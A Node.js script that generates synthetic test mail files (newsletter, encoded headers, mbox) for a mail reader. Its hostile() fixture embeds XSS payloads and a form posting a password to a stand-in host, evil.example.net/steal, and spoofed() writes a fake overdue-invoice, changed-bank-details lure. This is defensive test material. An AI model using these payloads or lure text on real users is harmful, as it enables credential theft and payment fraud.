'use strict';
// Writes synthetic sample mail files. People, domains and IPs are made up: example.com/.org/.net and the
// documentation IP ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24). Deterministic output.
// usage: node scripts/make-samples.js <outDir> [mboxMessages]
const fs = require('fs');
const path = require('path');
const zlib = require('zlib');

let seed = 20261106;
const rnd = () => { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed / 0x7fffffff; };
const pick = a => a[Math.floor(rnd() * a.length)];
const CRLF = '\r\n';

// ---- tiny PNG writer ----
const CRC = new Int32Array(256).map((_, n) => { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; return c; });
function crc32(b) { let c = -1; for (const x of b) c = CRC[(c ^ x) & 255] ^ (c >>> 8); return (c ^ -1) >>> 0; }
function chunk(type, data) { const l = Buffer.alloc(4); l.writeUInt32BE(data.length); const td = Buffer.concat([Buffer.from(type), data]); const c = Buffer.alloc(4); c.writeUInt32BE(crc32(td)); return Buffer.concat([l, td, c]); }
function png(w, h, px) {
  const raw = Buffer.alloc((w * 3 + 1) * h);
  for (let y = 0; y < h; y++) { raw[y * (w * 3 + 1)] = 0; for (let x = 0; x < w; x++) { const [r, g, b] = px(x, y); const o = y * (w * 3 + 1) + 1 + x * 3; raw[o] = r; raw[o + 1] = g; raw[o + 2] = b; } }
  const ih = Buffer.alloc(13); ih.writeUInt32BE(w, 0); ih.writeUInt32BE(h, 4); ih[8] = 8; ih[9] = 2;
  return Buffer.concat([Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]), chunk('IHDR', ih), chunk('IDAT', zlib.deflateSync(raw)), chunk('IEND', Buffer.alloc(0))]);
}
const logo = png(160, 48, (x, y) => {
  if (Math.hypot(x - 24, y - 24) < 16) return [33, 150, 243];
  if (x > 48 && x < 150 && y > 14 && y < 34 && ((x - 48) % 18 < 12)) return [40, 60, 90];
  return [244, 248, 252];
});
const chart = png(240, 120, (x, y) => {
  const bars = [60, 85, 40, 100, 75, 95];
  const i = Math.floor((x - 15) / 37), inBar = i >= 0 && i < 6 && (x - 15) % 37 < 26;
  if (inBar && 110 - y < bars[i]) return i === 3 ? [76, 175, 80] : [100, 149, 237];
  if (y === 110) return [120, 120, 120];
  return [255, 255, 255];
});

const b64 = buf => buf.toString('base64').replace(/.{76}/g, '$&' + CRLF);
const qp = s => Buffer.from(s, 'utf8').toString('latin1').replace(/[=\x80-\xff]/g, c => '=' + c.charCodeAt(0).toString(16).toUpperCase().padStart(2, '0'))
  .split('\n').map(l => l.replace(/(.{72})(?=.)/g, '$1=' + CRLF)).join(CRLF);
const enc = s => `=?UTF-8?B?${Buffer.from(s, 'utf8').toString('base64')}?=`;
const rfcDate = d => d.toUTCString().replace('GMT', '+0000');

function received(hops, start) {
  // hops: [[fromHost, ip, byHost, with, delaySeconds]] oldest first; headers are written newest first
  let t = start.getTime();
  const lines = hops.map(([from, ip, by, w, delay], i) => {
    t += delay * 1000;
    return `Received: from ${from} (${from} [${ip}])${CRLF}\tby ${by} with ${w} id ${(0x1a2b3c + i * 7919).toString(16).toUpperCase()}${CRLF}\tfor <maya.lopez@example.com>; ${rfcDate(new Date(t))}`;
  });
  return lines.reverse().join(CRLF);
}

function newsletter() {
  const d = new Date(Date.UTC(2026, 9, 14, 8, 30, 0));
  const pdf = Buffer.from('%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj 2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj 3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n');
  const csv = 'month,signups,churn\n2026-05,1204,2.1\n2026-06,1388,1.9\n2026-07,1502,2.4\n2026-08,1710,1.7\n2026-09,1835,1.6\n';
  const html = `<!DOCTYPE html><html><head><style>
body{background:#f4f6f9;margin:0}.wrap{max-width:600px;margin:0 auto;background:#fff;font-family:Helvetica,Arial,sans-serif;color:#24292f}
.hero{background:#0b3d63 url(https://images.example.com/hero-bg.jpg) no-repeat;color:#fff;padding:24px}
h1{font-size:22px;margin:8px 0}.box{padding:18px 24px;line-height:1.5}.btn{display:inline-block;background:#2196f3;color:#fff;padding:9px 16px;border-radius:4px;text-decoration:none}
.foot{font-size:12px;color:#57606a;padding:16px 24px;border-top:1px solid #d8dee4}</style></head>
<body><div class="wrap">
<div class="hero"><img src="cid:logo@example.com" alt="Northwind Labs" width="160" height="48"><h1>October product update</h1><div>Three things we shipped this month</div></div>
<div class="box"><p>Hi Maya,</p>
<p>Here is what changed in Northwind Analytics since September. The full numbers are in the attached CSV.</p>
<p><img src="cid:chart@example.com" alt="Signups by month" width="240" height="120"></p>
<p><b>1. Faster dashboards.</b> Saved views now open in under a second.<br><b>2. Scheduled exports</b> to CSV and Parquet.<br><b>3. Team spaces</b> with their own permissions.</p>
<p><img src="https://images.example.com/feature-teams.png" alt="Team spaces screenshot" width="520" height="180"></p>
<p><a class="btn" href="https://www.example.com/changelog/2026-10">Read the changelog</a></p>
<p>Questions? Reply to this email or write to <a href="mailto:support@example.com">support@example.com</a>.</p>
</div>
<div class="foot">Northwind Labs, 100 Example Street, Springfield. <a href="https://www.example.com/unsubscribe?u=4821">Unsubscribe</a>
<img src="https://track.example.net/open.gif?u=4821&amp;c=oct" width="1" height="1" alt=""></div>
</div></body></html>`;
  const text = 'Hi Maya,\n\nHere is what changed in Northwind Analytics since September. The full numbers are in the attached CSV.\n\n1. Faster dashboards. Saved views now open in under a second.\n2. Scheduled exports to CSV and Parquet.\n3. Team spaces with their own permissions.\n\nRead the changelog: https://www.example.com/changelog/2026-10\n\nNorthwind Labs, 100 Example Street, Springfield.\nUnsubscribe: https://www.example.com/unsubscribe?u=4821\n';
  return [
    received([
      ['mailer-07.example.com', '198.51.100.23', 'relay-2.example.com', 'ESMTP', 0],
      ['relay-2.example.com', '198.51.100.40', 'mx1.example.org', 'ESMTPS (TLS1.3) tls TLS_AES_256_GCM_SHA384', 2],
      ['mx1.example.org', '203.0.113.5', 'filter.example.org', 'ESMTP', 1],
      ['filter.example.org', '203.0.113.9', 'mailstore.example.org', 'LMTP', 4],
    ], d),
    'Authentication-Results: mx1.example.org;' + CRLF + '\tspf=pass (mx1.example.org: domain of bounce@news.example.com designates 198.51.100.40 as permitted sender) smtp.mailfrom=bounce@news.example.com;' + CRLF + '\tdkim=pass header.d=example.com header.s=news2026 header.b=Xk3pQ1;' + CRLF + '\tdmarc=pass (p=REJECT sp=REJECT dis=NONE) header.from=example.com',
    'DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=example.com; s=news2026;' + CRLF + '\th=from:to:subject:date:message-id:mime-version:content-type; bh=47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=;' + CRLF + '\tb=Xk3pQ1SyntheticSignatureForTestingOnly0000000000000000000000==',
    'Return-Path: <bounce@news.example.com>',
    'From: Northwind Labs <news@example.com>',
    'To: Maya Lopez <maya.lopez@example.com>',
    'Reply-To: Northwind Support <support@example.com>',
    'Subject: October product update: faster dashboards and team spaces',
    `Date: ${rfcDate(d)}`,
    'Message-ID: <oct-2026-update.4821@news.example.com>',
    'List-Unsubscribe: <https://www.example.com/unsubscribe?u=4821>',
    'MIME-Version: 1.0',
    'Content-Type: multipart/mixed; boundary="mix-1"',
    '',
    '--mix-1',
    'Content-Type: multipart/related; boundary="rel-1"',
    '',
    '--rel-1',
    'Content-Type: multipart/alternative; boundary="alt-1"',
    '',
    '--alt-1',
    'Content-Type: text/plain; charset=utf-8',
    'Content-Transfer-Encoding: quoted-printable',
    '',
    qp(text),
    '--alt-1',
    'Content-Type: text/html; charset=utf-8',
    'Content-Transfer-Encoding: quoted-printable',
    '',
    qp(html),
    '--alt-1--',
    '--rel-1',
    'Content-Type: image/png; name="logo.png"',
    'Content-Transfer-Encoding: base64',
    'Content-ID: <logo@example.com>',
    'Content-Disposition: inline; filename="logo.png"',
    '',
    b64(logo),
    '--rel-1',
    'Content-Type: image/png; name="chart.png"',
    'Content-Transfer-Encoding: base64',
    'Content-ID: <chart@example.com>',
    'Content-Disposition: inline; filename="chart.png"',
    '',
    b64(chart),
    '--rel-1--',
    '--mix-1',
    'Content-Type: text/csv; name="signups-2026.csv"',
    'Content-Transfer-Encoding: base64',
    'Content-Disposition: attachment; filename="signups-2026.csv"',
    '',
    b64(Buffer.from(csv)),
    '--mix-1',
    'Content-Type: application/pdf; name="release-notes-october.pdf"',
    'Content-Transfer-Encoding: base64',
    'Content-Disposition: attachment; filename="release-notes-october.pdf"',
    '',
    b64(pdf),
    '--mix-1--',
    '',
  ].join(CRLF);
}

function spoofed() {
  const d = new Date(Date.UTC(2026, 9, 21, 15, 2, 11));
  return [
    received([
      ['unknown-host.example.net', '192.0.2.77', 'mx1.example.org', 'SMTP', 0],
      ['mx1.example.org', '203.0.113.5', 'mailstore.example.org', 'LMTP', 540],
    ], d),
    'Authentication-Results: mx1.example.org;' + CRLF + '\tspf=fail (mx1.example.org: domain of billing@example.com does not designate 192.0.2.77 as permitted sender) smtp.mailfrom=billing@example.com;' + CRLF + '\tdkim=none (message not signed);' + CRLF + '\tdmarc=fail (p=QUARANTINE dis=QUARANTINE) header.from=example.com',
    'Received-SPF: fail (mx1.example.org: domain of billing@example.com does not designate 192.0.2.77 as permitted sender) client-ip=192.0.2.77;',
    'From: "Example Billing" <billing@example.com>',
    'Reply-To: payments-desk@example.net',
    'To: accounts@example.org',
    'Subject: Overdue invoice INV-20931: payment needed today',
    `Date: ${rfcDate(d)}`,
    'Message-ID: <20261021150211.77@unknown-host.example.net>',
    'MIME-Version: 1.0',
    'Content-Type: text/plain; charset=utf-8',
    'Content-Transfer-Encoding: 8bit',
    '',
    'Hello,',
    '',
    'Invoice INV-20931 is 14 days overdue. Please pay today to avoid a late fee.',
    'Bank details changed this month. Reply to this message for the new account number.',
    '',
    'Example Billing',
    '',
  ].join(CRLF);
}

function hostile() {
  const d = new Date(Date.UTC(2026, 9, 25, 10, 0, 0));
  const html = `<html><head><meta http-equiv="refresh" content="0;url=https://evil.example.net/landing"><base href="https://evil.example.net/">
<link rel="stylesheet" href="https://evil.example.net/style.css"><link rel="dns-prefetch" href="//evil.example.net">
<style>@import url("https://evil.example.net/import.css"); .bg{background-image:url('https://evil.example.net/bg.png');padding:8px}</style>
<script>document.title='pwned'; parent.postMessage({type:'save',att:0},'*');</script></head>
<body onload="alert(1)"><h2>Test message with unsafe HTML</h2>
<p class="bg">Every unsafe part of this message is removed or blocked. Nothing here can run or load from the network.</p>
<img src="x" onerror="alert(2)"><img src="https://evil.example.net/pixel.gif" width="1" height="1">
<iframe src="https://evil.example.net/frame"></iframe><object data="https://evil.example.net/x.swf"></object>
<form action="https://evil.example.net/steal" method="post"><input name="password" value="secret"><button>Send</button></form>
<p><a href="javascript:alert(3)">javascript link</a> · <a href="https://www.example.com/safe">normal link (asks before it opens)</a></p>
<svg width="40" height="40"><image href="https://evil.example.net/svg.png" width="40" height="40"/><circle cx="20" cy="20" r="10" fill="#e91e63"/></svg>
<p>&lt;b&gt;escaped text stays text&lt;/b&gt;</p></body></html>`;
  return [
    'From: Test Sender <sender@example.net>',
    'To: Maya Lopez <maya.lopez@example.com>',
    'Subject: <img src=x onerror=alert(1)> unsafe HTML test',
    `Date: ${rfcDate(d)}`,
    'Message-ID: <unsafe-html-test@example.net>',
    'MIME-Version: 1.0',
    'Content-Type: text/html; charset=utf-8',
    '',
    html,
    '',
  ].join(CRLF);
}

function encoded() {
  const d = new Date(Date.UTC(2026, 10, 2, 7, 45, 0));
  const text = 'Bonjour Maya,\n\nVoici le résumé de la réunion à Zürich. Café à 9 h, déjeuner à 12 h 30.\n東京オフィスの予定も添付しました。\n\n— Élodie\n';
  return [
    `From: ${enc('Élodie Brémond')} <elodie@example.org>`,
    `To: Maya Lopez <maya.lopez@example.com>, ${enc('Søren Ødegård')} <soren@example.org>`,
    `Cc: ${enc('田中 花子')} <hanako@example.org>`,
    `Subject: ${enc('Résumé de la réunion – 東京 & Zürich')}`,
    `Date: ${rfcDate(d)}`,
    'Message-ID: <reunion-1102@example.org>',
    'MIME-Version: 1.0',
    'Content-Type: multipart/mixed; boundary="b2"',
    '',
    '--b2',
    'Content-Type: text/plain; charset=utf-8',
    'Content-Transfer-Encoding: quoted-printable',
    '',
    qp(text),
    '--b2',
    'Content-Type: text/calendar; charset=utf-8; method=REQUEST; name="reunion.ics"',
    'Content-Disposition: attachment; filename="reunion.ics"',
    '',
    'BEGIN:VCALENDAR', 'VERSION:2.0', 'PRODID:-//Example//Samples//EN', 'METHOD:REQUEST', 'BEGIN:VEVENT', 'UID:reunion-1102@example.org', 'DTSTART:20261110T090000Z', 'DTEND:20261110T100000Z', 'SUMMARY:Réunion', 'END:VEVENT', 'END:VCALENDAR',
    '--b2--',
    '',
  ].join(CRLF);
}

function emlx(msg) {
  const body = Buffer.from(msg, 'utf8');
  const plist = '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0"><dict><key>flags</key><integer>8590195713</integer></dict></plist>\n';
  return Buffer.concat([Buffer.from(`${body.length}\n`), body, Buffer.from(plist)]);
}

// ---- MBOX ----
const FIRST = ['Maya', 'Arjun', 'Lena', 'Tomás', 'Priya', 'Noah', 'Aiko', 'Femi', 'Ines', 'Jonas', 'Chloé', 'Ravi', 'Sara', 'Marek', 'Yuki', 'Omar'];
const LAST = ['Lopez', 'Shah', 'Fischer', 'Ortega', 'Nair', 'Brooks', 'Sato', 'Adeyemi', 'Costa', 'Weber', 'Martin', 'Iyer', 'Lind', 'Novak', 'Mori', 'Haddad'];
const DOMS = ['example.com', 'example.org', 'example.net', 'mail.example.com', 'corp.example.org'];
const TOPICS = ['Q4 planning notes', 'Build failing on main', 'Lunch on Thursday?', 'Design review: billing page', 'Re: flaky test in CI', 'Customer call summary', 'Invoice for October', 'Offsite agenda', 'Re: Re: database migration window', 'Release 2.14 checklist', 'Security patch rollout', 'Welcome to the team', 'Weekly metrics', 'Fwd: conference talk proposal', 'Draft blog post for review', 'On-call handover'];
const BODY = ['Thanks for the update. I left a few comments in the doc.', 'Can we move this to next week? Tuesday works better for me.', 'The fix is merged. CI is green again.', 'Attached are the numbers from last quarter.', 'From now on we deploy on Tuesdays and Thursdays only.', 'Please review before Friday.', 'Short version: we are on track.'];

function person() { const f = pick(FIRST), l = pick(LAST); return { name: `${f} ${l}`, addr: `${f.normalize('NFD').replace(/[^\w]/g, '').toLowerCase()}.${l.toLowerCase()}@${pick(DOMS)}` }; }
const hdrName = n => (/[^\x20-\x7e]/.test(n) ? enc(n) : `"${n}"`);

function mboxMessage(i, t) {
  const a = person(), b = person();
  const d = new Date(t);
  const subj = pick(TOPICS) + (rnd() < 0.15 ? ` #${1000 + i}` : '');
  const withAtt = rnd() < 0.2;
  const quoted = i % 50 === 7; // a body line starting with "From " (escaped as ">From " in mboxrd)
  const lines = [pick(BODY), '', pick(BODY)];
  if (quoted) lines.push('', '>From the notes: the window is 02:00-04:00 UTC.', '>>From an older thread: keep the backup.');
  lines.push('', `-- ${a.name}`);
  const hdr = [
    `From ${a.addr} ${d.toUTCString().replace(/^(\w+), (\d+) (\w+) (\d+) (\S+) GMT$/, '$1 $3 $2 $5 $4')}`,
    `Return-Path: <${a.addr}>`,
    received([[`mail.${a.addr.split('@')[1]}`, `198.51.100.${(i % 200) + 10}`, 'mx1.example.org', 'ESMTPS', 0], ['mx1.example.org', '203.0.113.5', 'mailstore.example.org', 'LMTP', 1 + (i % 5)]], d),
    `Authentication-Results: mx1.example.org; spf=${i % 37 === 0 ? 'softfail' : 'pass'} smtp.mailfrom=${a.addr.split('@')[1]}; dkim=${i % 29 === 0 ? 'fail' : 'pass'} header.d=${a.addr.split('@')[1]}; dmarc=${i % 37 === 0 || i % 29 === 0 ? 'fail' : 'pass'} header.from=${a.addr.split('@')[1]}`,
    `From: ${hdrName(a.name)} <${a.addr}>`,
    `To: ${hdrName(b.name)} <${b.addr}>`,
    `Subject: ${/[^\x20-\x7e]/.test(subj) ? enc(subj) : subj}`,
    `Date: ${rfcDate(d)}`,
    `Message-ID: <m${i}.${t}@${a.addr.split('@')[1]}>`,
    'MIME-Version: 1.0',
  ];
  let body;
  if (withAtt) {
    const csv = `id,value\n${Array.from({ length: 20 }, (_, k) => `${k},${Math.round(rnd() * 1000)}`).join('\n')}\n`;
    hdr.push('Content-Type: multipart/mixed; boundary="mb' + i + '"');
    body = [`--mb${i}`, 'Content-Type: text/plain; charset=utf-8', '', ...lines, `--mb${i}`, `Content-Type: text/csv; name="data-${i}.csv"`, 'Content-Transfer-Encoding: base64', `Content-Disposition: attachment; filename="data-${i}.csv"`, '', b64(Buffer.from(csv)), `--mb${i}--`];
  } else {
    hdr.push('Content-Type: text/plain; charset=utf-8', 'Content-Transfer-Encoding: 8bit');
    body = lines;
  }
  // mboxrd: quote body lines that match /^>*From /
  const q = body.join('\n').split('\n').map(l => (/^>*From /.test(l) ? '>' + l : l));
  return hdr.join('\n').replace(/\r\n/g, '\n') + '\n\n' + q.join('\n') + '\n';
}

function mbox(n, startMs) {
  const parts = [];
  let t = startMs;
  for (let i = 0; i < n; i++) { t += Math.floor(rnd() * 5 * 3600 * 1000); parts.push(mboxMessage(i, t)); }
  return parts.join('\n');
}

function writeAll(dir, n = 2500) {
  fs.mkdirSync(dir, { recursive: true });
  const files = {
    'newsletter.eml': newsletter(),
    'invoice-spf-fail.eml': spoofed(),
    'unsafe-html.eml': hostile(),
    'encoded-headers.eml': encoded(),
    'apple-mail.emlx': emlx(encoded().replace(/Subject: [^\r\n]*/, 'Subject: Apple Mail copy of the meeting notes')),
    'team-inbox.mbox': mbox(n, Date.UTC(2025, 0, 6, 9, 0, 0)),
  };
  for (const [f, data] of Object.entries(files)) fs.writeFileSync(path.join(dir, f), data);
  return Object.keys(files).map(f => [f, fs.statSync(path.join(dir, f)).size]);
}

if (require.main === module) {
  const out = process.argv[2] || 'samples';
  for (const [f, s] of writeAll(out, Number(process.argv[3]) || 2500)) console.log(`${f}\t${s}`);
}

module.exports = { writeAll, mbox, newsletter, spoofed, hostile, encoded, emlx, png };
